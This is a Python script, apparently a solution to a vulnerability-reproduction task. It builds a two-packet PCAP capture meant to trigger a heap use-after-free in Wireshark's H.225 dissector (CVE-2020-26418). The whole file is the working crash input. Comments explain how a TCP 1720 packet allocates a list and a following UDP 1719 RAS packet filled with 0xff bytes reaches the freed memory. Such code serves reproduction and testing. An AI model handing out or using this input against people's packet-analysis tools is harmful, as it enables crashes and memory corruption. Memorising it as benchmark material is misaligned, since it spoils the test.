import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PCAP file that triggers Heap Use-After-Free in H.225 dissector (CVE-2020-26418).
        # Requires two packets:
        # 1. TCP 1720 (H.225 CS-PDU): Triggers `next_tvb_init()`, allocating `next_tvb_list` in packet scope.
        # 2. UDP 1719 (H.225 RAS): Does NOT trigger `next_tvb_init()`, but accesses `next_tvb_list` which now points to freed memory.
        
        # DLT_RAW (12) is used to avoid Ethernet headers and save space.
        # Global Header: Magic(4), Maj(2), Min(2), Zone(4), Sig(4), Snap(4), Link(4)
        pcap_hdr = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 0xffff, 12)

        # --- Packet 1: TCP 1720 ---
        # IP Header (20 bytes)
        ip1 = bytearray(20)
        ip1[0] = 0x45 # Ver 4, IHL 5
        ip1[9] = 6    # Protocol TCP
        ip1[12:16] = b'\x7f\x00\x00\x01'
        ip1[16:20] = b'\x7f\x00\x00\x01'
        
        # TCP Header (20 bytes)
        tcp1 = bytearray(20)
        tcp1[0:2] = struct.pack('>H', 12345)
        tcp1[2:4] = struct.pack('>H', 1720) # H.225 CS-PDU port
        tcp1[12] = 0x50 # Header length
        
        # Payload: TPKT Header (4 bytes) - Version 3, Length 4 (Empty PDU)
        # Sufficient to enter `dissect_h225_H323_UserInformation` and call `next_tvb_init`
        payload1 = b'\x03\x00\x00\x04'
        
        total_len1 = len(ip1) + len(tcp1) + len(payload1)
        struct.pack_into('>H', ip1, 2, total_len1)
        
        pkt1_hdr = struct.pack('<LLLL', 0, 0, total_len1, total_len1)
        pkt1 = pkt1_hdr + ip1 + tcp1 + payload1

        # --- Packet 2: UDP 1719 ---
        # IP Header (20 bytes)
        ip2 = bytearray(20)
        ip2[0] = 0x45
        ip2[9] = 17   # Protocol UDP
        ip2[12:16] = b'\x7f\x00\x00\x01'
        ip2[16:20] = b'\x7f\x00\x00\x01'
        
        # UDP Header (8 bytes)
        udp2 = bytearray(8)
        udp2[0:2] = struct.pack('>H', 12345)
        udp2[2:4] = struct.pack('>H', 1719) # H.225 RAS port
        
        # Payload: H.225 RAS Message (PER encoded)
        # Using 0xff bytes to set option bits (like nonStandardData) to present,
        # forcing the dissector to call `next_tvb_add_handle` and trigger UAF.
        payload2 = b'\xff' * 16
        
        udp_len = 8 + len(payload2)
        struct.pack_into('>H', udp2, 4, udp_len)
        
        total_len2 = len(ip2) + len(udp2) + len(payload2)
        struct.pack_into('>H', ip2, 2, total_len2)
        
        pkt2_hdr = struct.pack('<LLLL', 0, 0, total_len2, total_len2)
        pkt2 = pkt2_hdr + ip2 + udp2 + payload2

        return pcap_hdr + pkt1 + pkt2
